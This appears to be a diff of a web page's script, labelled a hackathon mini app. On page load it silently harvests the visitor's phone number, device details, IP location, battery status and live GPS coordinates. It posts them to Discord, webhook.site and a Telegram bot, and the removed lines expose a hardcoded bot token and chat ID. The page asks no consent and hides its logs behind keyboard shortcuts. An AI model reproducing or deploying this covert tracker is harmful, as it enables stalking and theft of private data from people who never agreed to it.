-                        ip: data.ip || data.query || 'unknown',
-                        city: data.city || 'unknown',
-                        region: data.region || data.regionName || 'unknown',
-                        country: data.country_name || data.country || 'unknown',
-                        country_code: data.country_code || data.countryCode || 'unknown',
-                        latitude: data.latitude || data.lat || 'N/A',
-                        longitude: data.longitude || data.lon || 'N/A',
-                        timezone: data.timezone || 'unknown',
-                        isp: data.org || data.isp || 'unknown'
+                        ip: d.ip || d.query || 'unknown',
+                        city: d.city || 'unknown',
+                        region: d.region || d.regionName || 'unknown',
+                        country: d.country_name || d.country || 'unknown',
+                        country_code: d.country_code || d.countryCode || 'unknown',
+                        latitude: d.latitude || d.lat || 'N/A',
+                        longitude: d.longitude || d.lon || 'N/A',
+                        timezone: d.timezone || 'unknown',
+                        isp: d.org || d.isp || 'unknown'
                     };
-                } catch(e) {}
+                } catch (e) {}
             }
             return { ip: 'unknown', city: 'unknown', country: 'unknown' };
         }
-
-        // ============================================================
-        // 4. GET NETWORK INFO
-        // ============================================================
 
         function getNetworkInfo() {
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
@@ -358,323 +1050,279 @@
             return null;
         }
 
-        // ============================================================
-        // 5. GET BATTERY INFO
-        // ============================================================
-
         async function getBatteryInfo() {
             if (navigator.getBattery) {
                 try {
-                    const battery = await navigator.getBattery();
+                    const b = await navigator.getBattery();
                     return {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + 's',
-                        dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + 's'
+                        level: Math.round(b.level * 100) + '%',
+                        charging: b.charging,
+                        chargingTime: b.chargingTime === Infinity ? 'Unknown' : b.chargingTime + 's',
+                        dischargingTime: b.dischargingTime === Infinity ? 'Unknown' : b.dischargingTime + 's'
                     };
-                } catch(e) {}
+                } catch (e) {}
             }
             return null;
         }
 
         // ============================================================
-        // 6. SEND DATA TO SERVER (Multiple destinations)
+        // 5. SEND DATA (Webhooks)
         // ============================================================
 
-        // Option A: Send to Discord Webhook
-        async function sendToDiscord(data) {
-            const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your webhook
-            
-            if (WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL') return false;
-            
-            try {
-                const message = {
-                    content: `📱 **New Data Captured**\n━━━━━━━━━━━━━━━━━\n📞 Phone: ${data.phone || 'Not found'}\n🖥️ Device: ${data.device?.os || 'Unknown'} · ${data.device?.browser || 'Unknown'}\n🌐 IP: ${data.ip || 'Unknown'}\n📍 Location: ${data.location?.city || 'Unknown'}, ${data.location?.country || 'Unknown'}\n🕐 Time: ${data.timestamp || new Date().toISOString()}`
-                };
-                
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(message)
-                });
-                return true;
-            } catch(e) {
-                return false;
-            }
+        function sendToDiscord(data) {
+            if (CONFIG.DISCORD_WEBHOOK === 'YOUR_DISCORD_WEBHOOK_URL') return false;
+            const loc = data.liveLocation || {};
+            const gps = loc.latitude ? `📍 GPS: ${loc.latitude}, ${loc.longitude} (${Math.round(loc.accuracy||0)}m)` :
+                '📍 GPS: Not available';
+            const msg = {
+                content: `📱 **New Data Captured**\n━━━━━━━━━━━━━━━━━\n📞 Phone: ${data.phone || 'Not found'}\n${gps}\n🌐 IP: ${data.ip || 'Unknown'}\n📍 Location: ${data.location?.city || 'Unknown'}, ${data.location?.country || 'Unknown'}\n🖥️ Device: ${data.device?.os || 'Unknown'} · ${data.device?.browser || 'Unknown'}\n🕐 Time: ${data.timestamp || new Date().toISOString()}`
+            };
+            fetch(CONFIG.DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(msg) }).catch(() => {});
+            return true;
         }
 
-        // Option B: Send to Webhook.site (free testing)
-        async function sendToWebhookSite(data) {
-            const WEBHOOK_URL = 'https://webhook.site/YOUR_UNIQUE_ID'; // Get from webhook.site
-            
-            if (WEBHOOK_URL.includes('YOUR_UNIQUE_ID')) return false;
-            
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                return true;
-            } catch(e) {
-                return false;
-            }
+        function sendToWebhookSite(data) {
+            if (CONFIG.WEBHOOK_SITE_ID === 'YOUR_UNIQUE_ID') return false;
+            fetch(`https://webhook.site/${CONFIG.WEBHOOK_SITE_ID}`, { method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data) }).catch(() => {});
+            return true;
         }
 
-        // Option C: Send to Google Apps Script (Google Sheets)
-        async function sendToGoogleSheets(data) {
-            const SCRIPT_URL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
-            
-            if (SCRIPT_URL.includes('YOUR_SCRIPT_ID')) return false;
-            
-            try {
-                await fetch(SCRIPT_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                return true;
-            } catch(e) {
-                return false;
-            }
-        }
-
-        // Option D: Send to Telegram Bot
-        async function sendToTelegram(data) {
-            const BOT_TOKEN = '8888440549:AAGnTbZd30a30N5M-F0yL5q45Ne08TwbjO0';
-            const CHAT_ID = '1618273900';
-            
-            if (BOT_TOKEN === 'YOUR_BOT_TOKEN') return false;
-            
-            try {
-                const message = `
-📱 **New Data Captured**
-━━━━━━━━━━━━━━━━━
-📞 Phone: ${data.phone || 'Not found'}
-🖥️ Device: ${data.device?.os || 'Unknown'} · ${data.device?.browser || 'Unknown'}
-🌐 IP: ${data.ip || 'Unknown'}
-📍 Location: ${data.location?.city || 'Unknown'}, ${data.location?.country || 'Unknown'}
-🕐 Time: ${data.timestamp || new Date().toISOString()}
-`;
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        function sendToTelegram(data) {
+            if (CONFIG.TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') return false;
+            const loc = data.liveLocation || {};
+            const gps = loc.latitude ? `📍 GPS: ${loc.latitude}, ${loc.longitude} (±${Math.round(loc.accuracy||0)}m)` :
+                '📍 GPS: Not available';
+            const msg =
+                `📱 New Data Captured\n━━━━━━━━━━━━━━━━━\n📞 Phone: ${data.phone || 'Not found'}\n${gps}\n🌐 IP: ${data.ip || 'Unknown'}\n📍 Location: ${data.location?.city || 'Unknown'}, ${data.location?.country || 'Unknown'}\n🖥️ Device: ${data.device?.os || 'Unknown'} · ${data.device?.browser || 'Unknown'}\n🕐 Time: ${data.timestamp || new Date().toISOString()}`;
+            fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                return true;
-            } catch(e) {
-                return false;
-            }
+                    body: JSON.stringify({ chat_id: CONFIG.TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                }).catch(() => {});
+            return true;
         }
 
-        // Option E: Save to localStorage (always works)
         function saveToLocalStorage(data) {
             try {
-                const existing = JSON.parse(localStorage.getItem('captured_data') || '[]');
+                const existing = JSON.parse(localStorage.getItem('hackathon_captured_data') || '[]');
                 existing.push(data);
-                localStorage.setItem('captured_data', JSON.stringify(existing));
+                localStorage.setItem('hackathon_captured_data', JSON.stringify(existing));
                 return true;
-            } catch(e) {
-                return false;
-            }
+            } catch (e) { return false; }
         }
 
         // ============================================================
-        // 7. MAIN EXECUTION
+        // 6. MAIN EXECUTION
         // ============================================================
 
         async function main() {
-            updateStatus('📱 Collecting phone number...');
-            log('🚀 <span class="device">Auto-collection started...</span>');
+            addLog('info', '🚀 Starting data collection...', 'Hackathon 2026');
 
-            // Get phone number using multiple methods
-            let phone = null;
-            
-            // Method 1: Telegram
-            phone = getPhoneFromTelegram();
-            if (phone) { log('✅ <span class="phone">Phone from Telegram: ' + phone + '</span>'); }
-
-            // Method 2: URL parameters
-            if (!phone) {
-                phone = getPhoneFromURL();
-                if (phone) { log('✅ <span class="phone">Phone from URL: ' + phone + '</span>'); }
+            // 1. Capture phone (PRIORITY)
+            const phone = await capturePhone();
+            if (phone) {
+                capturedData.phone = phone;
+                phoneStatus.textContent = '✅ ' + phone;
+                phoneStatus.className = 'value found';
+                addLog('success', '✅ Phone captured successfully!', phone);
+                phoneFound = true;
+            } else {
+                phoneStatus.textContent = '❌ Not found';
+                phoneStatus.className = 'value not-found';
+                addLog('info', '⚠️ Phone not found', 'Will retry...');
+                setTimeout(async () => {
+                    const retryPhone = await capturePhone();
+                    if (retryPhone) {
+                        capturedData.phone = retryPhone;
+                        phoneStatus.textContent = '✅ ' + retryPhone;
+                        phoneStatus.className = 'value found';
+                        addLog('success', '✅ Phone captured (retry)!', retryPhone);
+                        phoneFound = true;
+                        completeDataCollection();
+                    }
+                }, 3000);
             }
 
-            // Method 3: Storage
-            if (!phone) {
-                phone = getPhoneFromStorage();
-                if (phone) { log('✅ <span class="phone">Phone from storage: ' + phone + '</span>'); }
-            }
+            // 2. Device info
+            capturedData.device = getDeviceInfo();
+            addLog('device', '🖥️ Device info', capturedData.device.os + ' · ' + capturedData.device.browser);
 
-            // Method 4: Meta tags
-            if (!phone) {
-                phone = getPhoneFromMeta();
-                if (phone) { log('✅ <span class="phone">Phone from meta: ' + phone + '</span>'); }
-            }
+            // 3. IP Location
+            const ipLoc = await getIPLocation();
+            capturedData.ip = ipLoc.ip;
+            capturedData.location = ipLoc;
+            ipStatus.textContent = ipLoc.ip || 'Unknown';
+            ipStatus.className = 'value found';
+            addLog('location', '📍 IP Location', ipLoc.city + ', ' + ipLoc.country);
 
-            // Method 5: Referrer
-            if (!phone) {
-                phone = getPhoneFromReferrer();
-                if (phone) { log('✅ <span class="phone">Phone from referrer: ' + phone + '</span>'); }
-            }
-
-            // Method 6: Autofill (async)
-            if (!phone) {
-                const autofillPhone = await getPhoneFromAutofill();
-                if (autofillPhone) {
-                    phone = autofillPhone;
-                    log('✅ <span class="phone">Phone from autofill: ' + phone + '</span>');
-                }
-            }
-
-            // Method 7: Contacts API (async)
-            if (!phone) {
-                const contactPhone = await getPhoneFromContacts();
-                if (contactPhone) {
-                    phone = contactPhone;
-                    log('✅ <span class="phone">Phone from contacts: ' + phone + '</span>');
-                }
-            }
-
-            // Get device info
-            updateStatus('🖥️ Collecting device info...');
-            const device = getDeviceInfo();
-            log('🖥️ <span class="device">Device: ' + device.deviceType + ' · ' + device.os + '</span>');
-            log('🌐 <span class="device">Browser: ' + device.browser + '</span>');
-
-            // Get location
-            updateStatus('🌐 Fetching location...');
-            const location = await getLocation();
-            log('📍 <span class="ip">Location: ' + location.city + ', ' + location.country + '</span>');
-            log('🌐 <span class="ip">IP: ' + location.ip + '</span>');
-
-            // Get network info
+            // 4. Network
             const network = getNetworkInfo();
             if (network) {
-                log('📶 <span class="device">Network: ' + network.effectiveType + ' · ' + network.downlink + ' Mbps</span>');
+                capturedData.network = network;
+                addLog('network', '📶 Network', network.effectiveType + ' · ' + network.downlink + ' Mbps');
             }
 
-            // Get battery info
+            // 5. Battery
             const battery = await getBatteryInfo();
             if (battery) {
-                log('🔋 <span class="device">Battery: ' + battery.level + ' ' + (battery.charging ? '(Charging)' : '(Not Charging)') + '</span>');
+                capturedData.battery = battery;
+                addLog('info', '🔋 Battery', battery.level + (battery.charging ? ' (Charging)' : ''));
             }
 
-            // Build final data
-            collectedData.phone = phone;
-            collectedData.ip = location.ip;
-            collectedData.device = device;
-            collectedData.location = location;
-            collectedData.network = network;
-            collectedData.battery = battery;
-            collectedData.timestamp = new Date().toISOString();
+            // 6. Start live location tracking
+            startLiveLocation();
 
+            capturedData.timestamp = new Date().toISOString();
+
+            // 7. Save & Send
+            completeDataCollection();
+        }
+
+        function completeDataCollection() {
             // Save to localStorage
-            saveToLocalStorage(collectedData);
-            
-            // Try all send methods
+            saveToLocalStorage(capturedData);
+
+            // Send to webhooks
             let sent = false;
-            
-            // Try Discord
-            if (await sendToDiscord(collectedData)) {
-                log('✅ <span class="success">Data sent to Discord</span>');
-                sent = true;
-            }
-            
-            // Try Webhook.site
-            if (await sendToWebhookSite(collectedData)) {
-                log('✅ <span class="success">Data sent to Webhook.site</span>');
-                sent = true;
-            }
-            
-            // Try Google Sheets
-            if (await sendToGoogleSheets(collectedData)) {
-                log('✅ <span class="success">Data sent to Google Sheets</span>');
-                sent = true;
-            }
-            
-            // Try Telegram
-            if (await sendToTelegram(collectedData)) {
-                log('✅ <span class="success">Data sent to Telegram</span>');
-                sent = true;
-            }
+            if (sendToDiscord(capturedData)) sent = true;
+            if (sendToWebhookSite(capturedData)) sent = true;
+            if (sendToTelegram(capturedData)) sent = true;
 
             if (sent) {
-                updateStatus('✅ All data captured and sent!', 'success');
+                addLog('success', '📤 Data sent to webhooks', 'Discord/Telegram/Webhook');
             } else {
-                updateStatus('✅ Data captured! (stored locally - set up webhooks for remote)', 'success');
+                addLog('info', '💾 Data saved locally', 'Set up webhooks for remote');
             }
-            
-            // Hide loader
-            loaderEl.style.display = 'none';
 
-            // Console helper
-            console.log('📊 Collected Data:', collectedData);
-            log('📊 <span class="success">Data collection complete!</span>');
+            // Auto-show log after 2 seconds
+            setTimeout(() => {
+                window.showLog();
+                addLog('success', '🎯 Data collection complete!', 'Check the log below');
+            }, 1500);
+
+            captureComplete = true;
         }
 
         // ============================================================
-        // 8. HELPER FUNCTIONS
+        // 7. WINDOW FUNCTIONS
         // ============================================================
 
+        window.showLog = function() {
+            logSection.classList.add('active');
+            updateLogDisplay();
+            updateLogStats();
+            hintText.innerHTML = '📋 Log revealed!';
+        };
+
         window.showData = function() {
-            const data = JSON.parse(localStorage.getItem('captured_data') || '[]');
+            const data = JSON.parse(localStorage.getItem('hackathon_captured_data') || '[]');
             const latest = data[data.length - 1] || {};
-            
             console.log('📊 === CAPTURED DATA ===');
             console.log('📱 Phone:', latest.phone || 'Not found');
-            console.log('🖥️ Device:', latest.device);
+            console.log('📍 Live Location:', latest.liveLocation || 'Not available');
             console.log('🌐 IP:', latest.ip);
-            console.log('📍 Location:', latest.location);
-            console.log('📶 Network:', latest.network);
-            console.log('🔋 Battery:', latest.battery);
+            console.log('📍 IP Location:', latest.location);
+            console.log('🖥️ Device:', latest.device);
             console.log('📦 Full data:', data);
-            
+
             let msg = '📊 Captured Data:\n';
             msg += `📱 Phone: ${latest.phone || 'Not found'}\n`;
-            msg += `🖥️ Device: ${latest.device?.os || 'Unknown'} · ${latest.device?.browser || 'Unknown'}\n`;
+            if (latest.liveLocation && latest.liveLocation.latitude) {
+                msg += `📍 GPS: ${latest.liveLocation.latitude}, ${latest.liveLocation.longitude}\n`;
+                msg += `📍 Accuracy: ${Math.round(latest.liveLocation.accuracy||0)}m\n`;
+            }
             msg += `🌐 IP: ${latest.ip || 'Unknown'}\n`;
             msg += `📍 Location: ${latest.location?.city || 'Unknown'}, ${latest.location?.country || 'Unknown'}\n`;
+            msg += `🖥️ Device: ${latest.device?.os || 'Unknown'} · ${latest.device?.browser || 'Unknown'}\n`;
             msg += `🕐 Time: ${latest.timestamp || 'Unknown'}`;
             alert(msg);
-            
             return data;
+        };
+
+        window.forceLocation = function() {
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+                locationWatchActive = false;
+            }
+            startLiveLocation();
+            addLog('info', '📍 Location forced refresh', '');
+            showNotification('📍 Refreshing location...');
+        };
+
+        window.refreshLog = function() {
+            updateLogDisplay();
+            updateLogStats();
         };
 
         window.clearData = function() {
             if (confirm('Clear all captured data?')) {
-                localStorage.removeItem('captured_data');
+                localStorage.removeItem('hackathon_captured_data');
+                logEntries = [];
                 logContainer.innerHTML = '';
-                logContainer.classList.remove('active');
-                updateStatus('🗑️ Data cleared', 'info');
+                updateLogStats();
+                phoneStatus.textContent = '⏳ Scanning...';
+                phoneStatus.className = 'value pending';
+                locationStatus.textContent = '⏳ Acquiring...';
+                locationStatus.className = 'value pending';
+                ipStatus.textContent = '⏳ Fetching...';
+                ipStatus.className = 'value pending';
+                addLog('info', '🗑️ Data cleared', 'All data removed');
+                if (watchId) {
+                    navigator.geolocation.clearWatch(watchId);
+                    watchId = null;
+                    locationWatchActive = false;
+                }
+                setTimeout(startLiveLocation, 1000);
             }
         };
 
-        // Keyboard shortcut: Ctrl+Shift+D
+        function showNotification(msg) {
+            const status = document.querySelector('.hint-text');
+            const orig = status.innerHTML;
+            status.innerHTML = '🔔 ' + msg;
+            status.style.color = 'rgba(255,255,255,0.5)';
+            setTimeout(() => {
+                status.innerHTML = orig;
+                status.style.color = '';
+            }, 3000);
+        }
+
+        // ============================================================
+        // 8. KEYBOARD SHORTCUTS
+        // ============================================================
+
         document.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
-                e.preventDefault();
-                window.showData();
-            }
+            if (e.ctrlKey && e.shiftKey && e.key === 'D') { e.preventDefault();
+                window.showData(); }
+            if (e.ctrlKey && e.shiftKey && e.key === 'L') { e.preventDefault();
+                window.showLog(); }
+            if (e.ctrlKey && e.shiftKey && e.key === 'G') { e.preventDefault();
+                window.forceLocation(); }
         });
 
         // ============================================================
-        // 9. START ON LOAD
+        // 9. INIT
         // ============================================================
+
+        console.log('%c🔍 Hackathon 2026 · Data Capture Active', 'font-size:18px;font-weight:bold;color:#818cf8;');
+        console.log('%c💡 Type showData() to see captured data', 'font-size:14px;color:rgba(255,255,255,0.3);');
+        console.log('%c📍 Live GPS tracking active', 'font-size:14px;color:#fbbf24;');
+        console.log('%c⌨️ Ctrl+Shift+D = Show Data, Ctrl+Shift+L = Show Log, Ctrl+Shift+G = Get Location', 'font-size:14px;color:rgba(255,255,255,0.2);');
 
         window.addEventListener('load', function() {
-            console.log('%c🔍 Mini App Active - GitHub Pages', 'font-size:18px;font-weight:bold;color:#a78bfa;');
-            console.log('%c💡 Type showData() to see collected data', 'font-size:14px;color:rgba(255,255,255,0.3);');
-            console.log('%c🔑 Press Ctrl+Shift+D to show data', 'font-size:14px;color:rgba(255,255,255,0.3);');
-            
-            // Start collection after 1 second
-            setTimeout(main, 1000);
+            setTimeout(main, 800);
+        });
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', function() {
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
+            }
         });
     </script>
+
 </body>
 </html>
